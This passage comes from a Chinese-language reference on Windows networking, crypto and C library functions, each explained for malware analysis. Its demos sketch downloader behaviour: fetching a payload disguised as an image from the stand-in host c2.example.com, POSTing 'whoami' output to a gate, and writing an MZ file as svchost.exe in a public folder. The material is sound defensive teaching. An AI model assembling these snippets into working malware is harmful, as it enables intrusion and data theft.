#include <wininet.h>
#include <stdio.h>

int main() {
    HINTERNET hNet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hConn = InternetConnectA(hNet, "c2.example.com", 443, NULL, NULL,
                                       INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hReq = HttpOpenRequestA(hConn, "GET", "/images/logo.png", NULL, NULL,
                                      NULL, INTERNET_FLAG_SECURE, 0);
    if (hReq) {
        printf("请求已构造: GET /images/logo.png\n");
    }
    return 0;
}
```

**在病毒分析中的价值**：恶意下载器常用看似图片/静态资源的 URI 存放加密载荷（如 `/images/logo.png` 实为 stager）。`HttpOpenRequestA` 能还原其**回调路径**，与域名合并即完整 URL 特征。


## HttpSendRequestA（）：发送 HTTP 请求

发送已构造的 HTTP 请求并等待服务器响应（POST 时附带请求体）。

**函数原型**：
```c
BOOL HttpSendRequestA(
  HINTERNET hRequest,                   // HttpOpenRequest 返回的句柄
  LPCSTR    lpszHeaders,                // 附加请求头（NULL）
  DWORD     dwHeadersLength,            // 头长度
  LPVOID    lpOptional,                 // POST 请求体（可 NULL）
  DWORD     dwOptionalLength            // 请求体长度
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hRequest` | `HINTERNET` | 请求句柄。 |
| `lpszHeaders` | `LPCSTR` | 附加的 HTTP 头，如 `"Content-Type: application/x-www-form-urlencoded"`。 |
| `lpOptional` | `LPVOID` | 额外数据：POST 的 body（上报数据/指令回显）。 |
| `dwOptionalLength` | `DWORD` | 上面数据的长度。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`

**使用示范**：
```c
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

int main() {
    // 假设 hReq 来自 HttpOpenRequestA("POST", "/gate.php")
    HINTERNET hReq = NULL; // 省略……
    const char *body = "cmd=whoami&id=PC-001";
    if (hReq) {
        if (HttpSendRequestA(hReq,
                "Content-Type: application/x-www-form-urlencoded",
                -1L, (LPVOID)body, (DWORD)strlen(body))) {
            printf("请求已发送（POST body: %s）\n", body);
        }
    }
    return 0;
}
```

**在病毒分析中的价值**：POST 的 `lpOptional` 即木马**上报数据**（系统信息、窃取凭据、C2 回执）。结合上送前的加密/编码例程可还原其泄露了哪些信息、发给谁。

## InternetReadFile（）：读取响应内容

读取服务器响应的数据（下载的载荷/指令），可循环多次读取。

**函数原型**：
```c
BOOL InternetReadFile(
  HINTERNET hFile,                      // 请求句柄
  LPVOID    lpBuffer,                   // 接收缓冲区
  DWORD     dwNumberOfBytesToRead,      // 期望读取字节数
  LPDWORD   lpdwNumberOfBytesRead       // 实际读取字节数
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hFile` | `HINTERNET` | 已发送请求的句柄。 |
| `lpBuffer` | `LPVOID` | 存放响应数据的缓冲区。 |
| `dwNumberOfBytesToRead` | `DWORD` | 单次最多读取的字节数。 |
| `lpdwNumberOfBytesRead` | `LPDWORD` | 输出本次实际读到的字节数。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）；读到 `0` 字节表示响应结束
- **失败**：返回 `FALSE`

**使用示范**：
```c
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

int main() {
    HINTERNET hReq = NULL; // 已 HttpSendRequestA 的句柄
    BYTE buf[4096];
    DWORD read = 0;
    while (hReq && InternetReadFile(hReq, buf, sizeof(buf), &read) && read > 0) {
        // buf 里就是服务器返回的载荷/加密指令
        printf("读取到 %lu 字节\n", read);
    }
    return 0;
}
```

**在病毒分析中的价值**：`InternetReadFile` 收到的字节就是下载的**下一阶段载荷**（stager → 完整木马）。在此下断点导出缓冲区即可在不触发执行的情况下抓到二阶段样本，是动态分析的标准手法。

## InternetOpenUrlA（）：直接打开 URL

用一条 URL 字符串直接发起请求（简化版，无需逐层构造）。

**函数原型**：
```c
HINTERNET InternetOpenUrlA(
  HINTERNET hInternet,                  // 会话句柄
  LPCSTR    lpszUrl,                    // 完整 URL
  LPCSTR    lpszHeaders,                // 附加头（NULL）
  DWORD     dwHeadersLength,            // 头长度
  DWORD     dwFlags,                    // INTERNET_FLAG_SECURE 等
  DWORD_PTR dwContext                   // 0
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hInternet` | `HINTERNET` | 会话句柄。 |
| `lpszUrl` | `LPCSTR` | 完整 URL，如 `"https://c2.example.com/a.bin"`——**整个 C2 链路一目了然**。 |
| `dwFlags` | `DWORD` | HTTPS 时加 `INTERNET_FLAG_SECURE`。 |

**返回值**：
- **成功**：返回可直接读取的句柄
- **失败**：返回 `NULL`

**使用示范**：
```c
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

int main() {
    HINTERNET hNet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hUrl = InternetOpenUrlA(hNet,
        "https://c2.example.com/images/logo.png", NULL, 0,
        INTERNET_FLAG_SECURE, 0);
    if (hUrl) {
        printf("已打开 URL，开始下载载荷…\n");
    }
    return 0;
}
```

**在病毒分析中的价值**：`InternetOpenUrlA` 的参数就是**完整 C2 URL**，无需再拼域名/路径，是分析最简单的入口。后续往往紧跟 `InternetReadFile` 下载并执行（`VirtualAlloc`+`CreateThread` 或写盘后 `CreateProcessA`）。


# Windows API (crypt32.dll)

crypt32.dll 提供 **证书与编码** 服务。其中 `CryptBinaryToStringA`/`CryptStringToBinaryA` 常用于 base64 编解码——恶意样本普遍用它做数据混淆（传输/存储载荷），分析价值极高。

## CryptStringToBinaryA（）：字符串解码为二进制

把 base64/HEX 等编码字符串解码回原始字节（解码下载或内嵌的载荷）。

**函数原型**：
```c
BOOL CryptStringToBinaryA(
  LPCSTR pszString,                     // 编码字符串
  DWORD  cchString,                     // 字符串长度（0 = 自动）
  DWORD  dwFlags,                       // 编码类型
  BYTE   *pbBinary,                     // 输出字节缓冲区
  DWORD  *pcbBinary,                    // 输入大小/输出实际大小
  DWORD  *pdwSkip,                      // 跳过字符数（可 NULL）
  DWORD  *pdwFlags                      // 输出标志（可 NULL）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `pszString` | `LPCSTR` | 要解码的字符串。 |
| `dwFlags` | `DWORD` | 编码类型：`CRYPT_STRING_BASE64`(base64)、`CRYPT_STRING_HEX`(十六进制)、`CRYPT_STRING_BASE64HEADER`(带 PEM 头) 等。 |
| `pbBinary` | `BYTE*` | 输出字节数组。首次调用可传 `NULL` 探测所需大小（`pcbBinary` 传地址）。 |
| `pcbBinary` | `DWORD*` | 输入输出：缓冲区字节数 / 实际字节数。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`

**使用示范**：
```c
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

int main() {
    // base64 后的 shellcode 片段（示意）
    const char *b64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA";
    DWORD need = 0;
    CryptStringToBinaryA(b64, 0, CRYPT_STRING_BASE64, NULL, &need, NULL, NULL);
    if (need) {
        BYTE *bin = (BYTE *)malloc(need);
        if (CryptStringToBinaryA(b64, 0, CRYPT_STRING_BASE64, bin, &need, NULL, NULL)) {
            printf("解码得到 %lu 字节\n", need);
        }
        free(bin);
    }
    return 0;
}
```

**运行结果示范**：
```text
解码得到 174 字节
```

**在病毒分析中的价值**：下载器/恶意文档常把二阶段 payload 以 base64 内嵌或下发，运行时 `CryptStringToBinaryA` 还原。在此下断并转储 `pbBinary` 输出，即可**不执行**地拿到真正的二进制载荷。

## CryptBinaryToStringA（）：二进制编码为字符串

把原始字节编码为 base64/HEX 字符串（上报窃取数据前常先编码）。

**函数原型**：
```c
BOOL CryptBinaryToStringA(
  const BYTE *pbBinary,                 // 原始数据
  DWORD       cbBinary,                 // 数据字节数
  DWORD       dwFlags,                  // 编码类型
  LPSTR       pszString,                // 输出字符串
  DWORD       *pcchString               // 输入输出：字符数
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `pbBinary` | `const BYTE*` | 要编码的字节数据。 |
| `cbBinary` | `DWORD` | 数据长度。 |
| `dwFlags` | `DWORD` | `CRYPT_STRING_BASE64`、`CRYPT_STRING_HEXASCII` 等。 |
| `pszString` | `LPSTR` | 输出字符串缓冲区（可传 `NULL` 探测大小）。 |
| `pcchString` | `DWORD*` | 输入输出：缓冲区字符数 / 实际字符数。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`

**使用示范**：
```c
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

int main() {
    BYTE data[] = "Hello C2";            // 要上报的数据
    DWORD need = 0;
    CryptBinaryToStringA(data, sizeof(data)-1, CRYPT_STRING_BASE64, NULL, &need);
    char *b64 = (char *)malloc(need);
    if (CryptBinaryToStringA(data, sizeof(data)-1, CRYPT_STRING_BASE64, b64, &need)) {
        printf("base64: %s\n", b64);
    }
    free(b64);
    return 0;
}
```

**运行结果示范**：
```text
base64: SGVsbG8gQzI=
```

**在病毒分析中的价值**：木马上报前把数据 base64 化以绕过文本过滤；`CryptBinaryToStringA` 的输入缓冲就是**即将外传的明文/密文**，可反推其窃取内容与 C2 上报格式。


# C 标准库 (stdio.h)

C 标准库中的 `stdio.h`（Standard Input/Output）提供了**输入输出功能**，包括文件读写、控制台输入输出、格式化字符串操作等。恶意代码分析中，该库的函数常用于日志记录、配置读写和调试信息输出。

## sprintf（）：格式化输出到字符串

将格式化数据写入字符串缓冲区，按指定格式组合文本与变量。

**函数原型**：
```c
int sprintf(
  char *str,                            // 目标字符串缓冲区
  const char *format,                   // 格式控制字符串
  ...                                   // 可变参数
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `str` | 目标字符数组（缓冲区），用于存放格式化后生成的字符串。需确保其大小足以容纳最终结果（含结尾 `\0`）。 |
| `format` | 格式控制字符串，包含普通文本和以 `%` 开头的格式占位符，如 `%s` 表示字符串、`%d` 表示十进制整数、`%x` 表示十六进制整数等。 |
| `...` | 可变参数列表，按顺序依次对应 `format` 中的每个占位符，提供要格式化的数据。 |

**常用占位符**：`%s`（字符串）、`%d`（十进制整数）、`%x`（十六进制整数）、`%p`（指针地址）、`%f`（浮点数）

**返回值**：返回写入 `str` 的字符数量（不含结尾 `\0`），可用于检查写入长度。

**使用示范**：
```c
#include <stdio.h>

int main() {
    char buffer[100];
    int score = 95;
    char name[] = "张三";

    int len = sprintf(buffer, "玩家 %s 的得分是 %d", name, score);

    printf("格式化后的字符串: %s\n", buffer);
    printf("写入的字符数: %d\n", len);

    return 0;
}
```

**运行结果示范**：
```text
格式化后的字符串: 玩家 张三 的得分是 95
写入的字符数: 16
```

**⚠️ 安全提醒**：`sprintf` **不检查缓冲区大小**，写入数据超出 `str` 容量时会溢出，可能导致程序崩溃或被利用。

**✅ 更安全的替代方案**：Windows 下使用 `sprintf_s`，Linux/通用环境下使用 `snprintf`。


## printf（）：格式化输出到标准输出

按格式控制字符串把数据输出到标准输出（控制台/终端）。

**函数原型**：
```c
int printf(
  const char *format,                   // 格式控制字符串
  ...                                   // 可变参数
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `format` | 格式字符串，含普通字符与占位符（`%d`/`%x`/`%s`/`%p` 等）。 |
| `...` | 与占位符一一对应的数据。 |

**返回值**：返回成功输出的字符数；出错返回负数。

**使用示范**：
```c
#include <stdio.h>

int main() {
    int pid = 1234;
    printf("PID = %d (十六进制: 0x%X)\n", pid, pid);
    return 0;
}
```

**运行结果示范**：
```text
PID = 1234 (十六进制: 0x4D2)
```

**在病毒分析中的价值**：加壳样本若在解码阶段使用 `printf`/`fprintf` 打印“版本号”“解密进度”，输出内容常是识别壳类型（UPX/VMProtect 等）的特征。


## fopen（）：打开文件

以指定模式打开文件，返回 `FILE*` 流指针供后续读写。

**函数原型**：
```c
FILE *fopen(
  const char *filename,                 // 文件名/路径
  const char *mode                      // 打开模式
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `filename` | 要打开的文件路径。 |
| `mode` | 打开模式：`"r"` 只读、`"w"` 写入（清空原内容）、`"a"` 追加、`"rb"`/`"wb"` 二进制读写。 |

**返回值**：
- **成功**：返回文件流指针 `FILE*`
- **失败**：返回 `NULL`，可用 `perror`/`errno` 查看原因

**使用示范**：
```c
#include <stdio.h>

int main() {
    FILE *fp = fopen("C:\\Users\\Public\\data.bin", "wb");
    if (fp) {
        printf("文件打开成功\n");
        fclose(fp);
    } else {
        printf("文件打开失败\n");
    }
    return 0;
}
```

**运行结果示范**：
```text
文件打开成功
```

**在病毒分析中的价值**：恶意代码常把配置、窃取的数据或解码载荷写入 `%APPDATA%`、`%TEMP%` 或启动目录下的文件，`fopen` 的路径参数可直接揭示其持久化位置。


## fclose（）：关闭文件流

关闭先前由 `fopen` 打开的流，把缓冲数据写盘并释放资源。

**函数原型**：
```c
int fclose(
  FILE *stream                          // 要关闭的文件流
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `stream` | 由 `fopen` 返回的 `FILE*`。传 `NULL` 行为未定义，关闭后不应再使用该指针。 |

**返回值**：
- **成功**：返回 `0`
- **失败**：返回 `EOF`（`-1`）

**使用示范**：
```c
#include <stdio.h>

int main() {
    FILE *fp = fopen("C:\\Users\\Public\\data.bin", "rb");
    if (fp) {
        // 读取/处理……
        if (fclose(fp) == 0) {
            printf("文件已安全关闭\n");
        }
    }
    return 0;
}
```

**运行结果示范**：
```text
文件已安全关闭
```

**在病毒分析中的价值**：结合 `fopen`/`fclose` 成对出现的调用点，可还原恶意程序的“文件生命周期”，判断其先写后读（下载→解密→执行）等操作顺序。


## fgets（）：从文件流读取一行字符串

从流中读取最多 `n-1` 个字符直到换行，存入缓冲区。

**函数原型**：
```c
char *fgets(
  char *str,                            // 接收数据的缓冲区
  int   n,                              // 缓冲区长度的上限
  FILE *stream                          // 文件流
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `str` | 存放读取结果的缓冲区，函数会在末尾补 `\0`。 |
| `n` | 最多读取 `n-1` 个字符（为 `\0` 留位置），超出部分留在流中。 |
| `stream` | 读取来源，常用 `stdin` 或 `fopen` 返回的流。 |

**返回值**：
- **成功**：返回 `str`
- **到达文件尾/出错**：返回 `NULL`

**使用示范**：
```c
#include <stdio.h>

int main() {
    char line[256];
    FILE *fp = fopen("C:\\config.ini", "r");
    if (!fp) return 1;

    while (fgets(line, sizeof(line), fp)) {
        printf("读取: %s", line);   // line 自带换行
    }
    fclose(fp);
    return 0;
}
```

**运行结果示范**：
```text
读取: server=192.168.1.10
读取: port=4444
```

**在病毒分析中的价值**：木马常用 `fgets` 逐行读取 C2 配置文件（服务器、端口、加密密钥），其中常含硬编码或加密的远控参数，值得重点提取。


## fprintf（）：格式化写入文件流

按格式把数据写入文件（日志、配置落盘等）。

**函数原型**：
```c
int fprintf(
  FILE *stream,                         // 目标文件流
  const char *format,                   // 格式控制字符串
  ...                                   // 可变参数
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `stream` | 目标流（`fopen` 打开的 `FILE*`）。 |
| `format` | 格式字符串（同 `printf`）。 |
| `...` | 与占位符对应的数据。 |

**返回值**：返回成功写入的字符数；失败返回负数。

**使用示范**：
```c
#include <stdio.h>

int main() {
    FILE *fp = fopen("C:\\Users\\Public\\log.txt", "a");
    if (fp) {
        fprintf(fp, "[%s] 连接服务器失败 err=%d\n", "2026-09-05", 10060);
        fclose(fp);
    }
    return 0;
}
```

**在病毒分析中的价值**：木马把 C2 通信结果、解密错误写入本地日志时，`fprintf` 的格式串能泄露其内部状态与数据结构，对还原协议有帮助。

## fread（）：从文件读取二进制块

从流中读取若干“元素”到缓冲区，常用于把整个文件读进内存。

**函数原型**：
```c
size_t fread(
  void *ptr,                            // 接收数据的缓冲区
  size_t size,                          // 每个元素的大小
  size_t nmemb,                         // 元素个数
  FILE  *stream                         // 文件流
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `ptr` | 输出缓冲区。 |
| `size` | 单个元素字节数。 |
| `nmemb` | 读取的元素个数（总共读取 `size*nmemb` 字节）。 |
| `stream` | 来源文件流。 |

**返回值**：返回实际读取的元素个数（可能少于请求值，如文件尾）。

**使用示范**：
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    FILE *fp = fopen("C:\\payload.bin", "rb");
    if (!fp) return 1;

    fseek(fp, 0, SEEK_END);
    long sz = ftell(fp);          // 文件大小
    fseek(fp, 0, SEEK_SET);

    unsigned char *buf = (unsigned char *)malloc(sz);
    if (buf) {
        size_t n = fread(buf, 1, sz, fp);   // 整个文件读入内存
        printf("读取 %zu / %ld 字节\n", n, sz);
        free(buf);
    }
    fclose(fp);
    return 0;
}
```

**在病毒分析中的价值**：恶意程序常把内嵌或解密后的载荷写盘再 `fread` 全量读入执行；`fread` 的目标缓冲区随后被 `VirtualAlloc`/`memcpy` 搬运或直接被调用，是“文件→内存→执行”链路的节点。

## fwrite（）：把内存数据写入文件

把缓冲区中的 `size*nmemb` 字节写入文件（落盘下载的载荷）。

**函数原型**：
```c
size_t fwrite(
  const void *ptr,                      // 要写入的数据
  size_t size,                          // 元素大小
  size_t nmemb,                         // 元素个数
  FILE  *stream                         // 文件流
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `ptr` | 要写盘的缓冲区（下载内容、解密后的载荷）。 |
| `size` / `nmemb` | 元素大小与个数。 |
| `stream` | 目标文件流。 |

**返回值**：返回实际写入的元素个数。

**使用示范**：
```c
#include <stdio.h>
#include <string.h>

int main() {
    FILE *fp = fopen("C:\\Users\\Public\\svchost.exe", "wb");
    if (fp) {
        // data 为从网络收到的载荷
        unsigned char data[] = {0x4D, 0x5A, 0x90, 0x00}; // "MZ.."
        size_t n = fwrite(data, 1, sizeof(data), fp);
        printf("写入 %zu 字节\n", n);
        fclose(fp);
    }
    return 0;
}
```

**运行结果示范**：
```text
写入 4 字节
```

**在病毒分析中的价值**：下载器把载荷 `fwrite` 到用户可写目录后通常接着 `CreateProcessA`/`WinExec` 运行。断点观察 `fwrite` 的目标路径与缓冲区即可**在不运行的情况下**导出落盘的二阶段文件。


## snprintf（）：限长格式化到字符串

安全版 `sprintf`：最多写 `size-1` 个字符并保证以 `\0` 结尾，防止缓冲区溢出。

**函数原型**：
```c
int snprintf(
  char *str,                            // 目标缓冲区
  size_t size,                          // 缓冲区大小
  const char *format,                   // 格式串
  ...                                   // 可变参数
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `str` | 输出缓冲区。 |
| `size` | 缓冲区总字节数（含结尾 `\0`）。 |
| `format` | 格式字符串。 |
| `...` | 数据参数。 |

**返回值**：返回**本应**写入的字符数（不含 `\0`）；若大于等于 `size` 表示被截断。注意：返回值可能大于实际写入量。

**使用示范**：
```c
#include <stdio.h>

int main() {
    char path[128];
    int n = snprintf(path, sizeof(path),
                     "C:\\Users\\Public\\%s", "payload.exe");
    printf("拼接结果: %s (%d 字符)\n", path, n);
    return 0;
}
```

**运行结果示范**：
```text
拼接结果: C:\Users\Public\payload.exe (27 字符)
```

**在病毒分析中的价值**：恶意代码用 `snprintf` 拼路径/命令行（如 `%APPDATA%`+文件名）。断点可看到格式化后最终目标，比逐段 `strcat` 更好还原“最终要做什么”。

## fscanf（）：从文件按格式读取

按格式串从文件中读取并解析数据（读取配置的数字/字符串）。

**函数原型**：
```c
int fscanf(
  FILE *stream,                         // 文件流
  const char *format,                   // 格式串
  ...                                   // 输出参数（需传地址）
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `stream` | 来源文件流。 |
| `format` | 格式串，如 `"%d"`、`"%s"`。 |
| `...` | 存放结果的**变量地址**（`&x`）。 |

**返回值**：返回成功匹配并赋值的输入项个数；`EOF` 表示文件尾或错误。

**使用示范**：
```c
#include <stdio.h>

int main() {
    // 读取 C2 配置：server=1.2.3.4 port=4444
    FILE *fp = fopen("C:\\config.ini", "r");
    if (fp) {
        char ip[64]; int port = 0;
        if (fscanf(fp, "server=%63s port=%d", ip, &port) == 2) {
            printf("C2: %s:%d\n", ip, port);
        }
        fclose(fp);
    }
    return 0;
}
```

**运行结果示范**：
```text
C2: 1.2.3.4:4444
```

**在病毒分析中的价值**：`fscanf` 是“读取文本配置”的信号。能直接把配置里解析出的 IP/端口/密钥读出来，等同白盒查看其 C2 参数。

## remove（）：删除文件

删除指定文件（C 标准版删除，作用同 Windows 的 `DeleteFile`）。

**函数原型**：
```c
int remove(
  const char *filename                  // 要删除的文件
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `filename` | 文件路径；文件必须未被占用（否则失败）。 |

**返回值**：
- **成功**：返回 `0`
- **失败**：返回非 0

**使用示范**：
```c
#include <stdio.h>

int main() {
    if (remove("C:\\Users\\Public\\dropper.tmp") == 0) {
        printf("临时文件已删除（自清理）\n");
    }
    return 0;
}
```

**运行结果示范**：
```text
临时文件已删除（自清理）
```

**在病毒分析中的价值**：恶意程序运行后删除自身或临时落盘文件以“擦除痕迹”。`remove`/`DeleteFile` 目标常指向其下载器临时文件，分析可借此还原被删载荷的原始路径。


# C 标准库 (string.h)

C 标准库中的 `string.h` 提供了**字符串和内存操作函数**，包括字符串拷贝、连接、比较、查找，以及内存块的填充、复制、比较等。恶意代码分析中，该库的函数常用于处理路径、比较密码、构造命令字符串等操作。

## strlen（）：计算字符串长度

计算字符串的长度，直到遇到第一个空字符 `\0` 为止。

**函数原型**：
```c
size_t strlen(
  const char *str                       // 要计算长度的字符串
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `str` | 要计算长度的字符串，必须是以空字符 `\0` 结尾的 C 字符串。该函数从起始位置开始逐字节计数，直到遇到第一个 `\0` 为止（不包含 `\0` 本身）。 |

**返回值**：返回字符串的字符数（类型为 `size_t`，即无符号整数），不包含结尾的 `\0`。

**使用示范**：
```c
#include <stdio.h>
#include <string.h>

int main() {
    char *text = "Hello, World!";
    size_t len = strlen(text);

    printf("字符串: %s\n", text);
    printf("长度: %zu 个字符\n", len);

    return 0;
}
```

**运行结果示范**：
```text
字符串: Hello, World!
长度: 13 个字符
```

**在病毒分析中的价值**：常用于计算路径长度、解密缓冲区大小或定位字符串末尾，以便进行后续复制或比较操作。


## strcmp（）：比较两个字符串

逐字符比较两个字符串，直到出现不同字符或遇到 `\0` 为止。

**函数原型**：
```c
int strcmp(
  const char *str1,                     // 第一个字符串
  const char *str2                      // 第二个字符串
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `str1` | 第一个参与比较的字符串。 |
| `str2` | 第二个参与比较的字符串。 |

**返回值**：
- 返回 `0`：两个字符串相等
- 返回值 `< 0`：`str1` 小于 `str2`
- 返回值 `> 0`：`str1` 大于 `str2`

**使用示范**：
```c
#include <stdio.h>
#include <string.h>

int main() {
    char password[] = "abc123";
    char input[] = "abc123";

    int result = strcmp(password, input);

    if (result == 0) {
        printf("密码正确！\n");
    } else {
        printf("密码错误！\n");
    }

    return 0;
}
```

**运行结果示范**：
```text
密码正确！
```

**在病毒分析中的价值**：病毒常使用 `strcmp` 来验证用户输入的密码、检测进程名或比较文件路径。调试时在此处下断点可直接看到比对的目标字符串，是提取密码或配置信息的关键位置。


## strcpy（）：复制字符串

把源字符串（含结尾 `\0`）复制到目标缓冲区。

**函数原型**：
```c
char *strcpy(
  char       *dest,                     // 目标缓冲区
  const char *src                       // 源字符串
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `dest` | 目标缓冲区，必须有足够空间容纳 `src`（含 `\0`）。 |
| `src` | 以 `\0` 结尾的源字符串。 |

**返回值**：返回 `dest`。

**⚠️ 安全提醒**：`strcpy` **不检查目标缓冲区大小**，`src` 过长会栈/堆溢出。应优先使用 `strncpy`（注意其不保证 `\0` 结尾）或 `strcpy_s`。

**使用示范**：
```c
#include <stdio.h>
#include <string.h>

int main() {
    char dest[64];
    strcpy(dest, "C:\\Windows\\Temp\\payload.exe");
    printf("复制结果: %s\n", dest);
    return 0;
}
```

**运行结果示范**：
```text
复制结果: C:\Windows\Temp\payload.exe
```

**在病毒分析中的价值**：恶意代码常 `strcpy` 拼接路径或命令字符串，之后传给 `CreateProcessA`/`system`。溢出类样本也会通过 `strcpy` 触发栈溢出——看到此类调用应检查目标缓冲区是否可越界。


## strcat（）：拼接字符串

把源字符串追加到目标字符串末尾。

**函数原型**：
```c
char *strcat(
  char       *dest,                     // 目标字符串（同时作为结果）
  const char *src                       // 要追加的字符串
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `dest` | 已有字符串的缓冲区，剩余空间须容纳 `src`。 |
| `src` | 追加到 `dest` 末尾的字符串。 |

**返回值**：返回 `dest`。

**⚠️ 安全提醒**：同样不检查边界，建议使用 `strncat` 或 `strcat_s`。

**使用示范**：
```c
#include <stdio.h>
#include <string.h>

int main() {
    char cmd[256] = "cmd.exe /c ";
    strcat(cmd, "whoami");
    printf("最终命令: %s\n", cmd);
    return 0;
}
```

**运行结果示范**：
```text
最终命令: cmd.exe /c whoami
```

**在病毒分析中的价值**：动态拼命令/路径（如 `%TEMP%` + 文件名）是常见手法，`strcat` 的第二个参数常是变量部分，断点观察可还原完整的目标路径或命令行。


## strchr（）：在字符串中查找字符

在字符串中查找**首次**出现指定字符的位置。

**函数原型**：
```c
char *strchr(
  const char *str,                      // 要查找的字符串
  int         c                         // 要查找的字符
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `str` | 被查找的字符串。 |
| `c` | 目标字符（以 `int` 传入，实际按 `char` 比较）。 |

**返回值**：
- **找到**：返回指向该字符的指针
- **未找到**：返回 `NULL`

**使用示范**：
```c
#include <stdio.h>
#include <string.h>

int main() {
    const char *path = "C:\\Windows\\System32\\cmd.exe";
    char *pSlash = strrchr(path, '\\');   // 用 strchr 取首个、strrchr 取末个
    printf("最后一个反斜杠位置: %s\n", pSlash ? pSlash : "未找到");
    return 0;
}
```

**运行结果示范**：
```text
最后一个反斜杠位置: \cmd.exe
```

**在病毒分析中的价值**：用于解析路径/协议（取域名、端口分隔符），恶意样本常用其定位文件扩展名以判断“要运行哪种载荷”。


## strstr（）：在字符串中查找子串

在字符串中查找**首次**出现另一子串的位置。

**函数原型**：
```c
char *strstr(
  const char *haystack,                 // 被查找的字符串
  const char *needle                    // 要查找的子串
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `haystack` | 被查找的主字符串。 |
| `needle` | 要定位的子串。 |

**返回值**：
- **找到**：返回指向 `haystack` 中子串首次出现处的指针
- **未找到**：返回 `NULL`

**使用示范**：
```c
#include <stdio.h>
#include <string.h>

int main() {
    const char *userAgent = "Mozilla/5.0 (Windows NT 10.0) Win64";
    if (strstr(userAgent, "Windows")) {
        printf("检测到 Windows 系统\n");
    }
    return 0;
}
```

**运行结果示范**：
```text
检测到 Windows 系统
```

**在病毒分析中的价值**：恶意代码用 `strstr` 判断 UA、命令输出或文件名里是否含特定关键字（如 `"admin"`、`"vmware"`），用于环境探测或功能选择，关键子串可直接作为 YARA 特征。


## memcmp（）：比较两块内存区域

比较两块内存区域的前 `n` 个字节是否相同。

**函数原型**：
```c
int memcmp(
  const void *ptr1,                     // 第一块内存地址
  const void *ptr2,                     // 第二块内存地址
  size_t      n                         // 要比较的字节数
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `ptr1` | 指向第一块内存区域的起始地址。 |
| `ptr2` | 指向第二块内存区域的起始地址。 |
| `n` | 要比较的字节数。 |

**返回值**：
- 返回 `0`：两块内存区域相等
- 返回值 `< 0`：`ptr1` 小于 `ptr2`
- 返回值 `> 0`：`ptr1` 大于 `ptr2`

**使用示范**：
```c
#include <stdio.h>
#include <string.h>

int main() {
    unsigned char data1[] = {0x01, 0x02, 0x03, 0x04};
    unsigned char data2[] = {0x01, 0x02, 0x03, 0x04};

    int result = memcmp(data1, data2, 4);

    if (result == 0) {
        printf("两段内存相同\n");
    } else {
        printf("两段内存不同\n");
    }

    return 0;
}
```

**运行结果示范**：
```text
两段内存相同
```

**在病毒分析中的价值**：病毒可能使用 `memcmp` 比较解密后的数据头、验证文件签名或检查内存中的特定数据结构，比 `strcmp` 更灵活，可用于二进制数据比对。


## memcpy（）：复制内存块

把源内存区域的 `n` 个字节复制到目标内存区域。

**函数原型**：
```c
void *memcpy(
  void       *dest,                     // 目标地址
  const void *src,                      // 源地址
  size_t      n                         // 复制的字节数
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `dest` | 目标内存起始地址，须有至少 `n` 字节空间。 |
| `src` | 源内存起始地址。 |
| `n` | 要复制的字节数。 |

**返回值**：返回 `dest`。

**⚠️ 安全提醒**：源/目标**不能重叠**（重叠请用 `memmove`）。

**使用示范**：
```c
#include <stdio.h>
#include <string.h>

int main() {
    unsigned char shellcode[8] = {0};
    unsigned char raw[] = {0xFC, 0xE8, 0x82, 0x00};

    memcpy(shellcode, raw, sizeof(raw));
    printf("已复制 %zu 字节\n", sizeof(raw));
    return 0;
}
```

**运行结果示范**：
```text
已复制 4 字节
```

**在病毒分析中的价值**：恶意样本常用 `memcpy` 把解密/解码后的字节搬进新分配的可执行内存（常紧跟 `VirtualAlloc`），或把远程内存读到本地。断点可观察源与目标地址来定位“解密缓冲区 → 执行区”的流转。


## memset（）：填充内存块

用指定值逐字节填充一段内存区域。

**函数原型**：
```c
void *memset(
  void *s,                              // 内存起始地址
  int   c,                              // 填充值（按 unsigned char 处理）
  size_t n                              // 填充的字节数
);
```

**参数说明**：

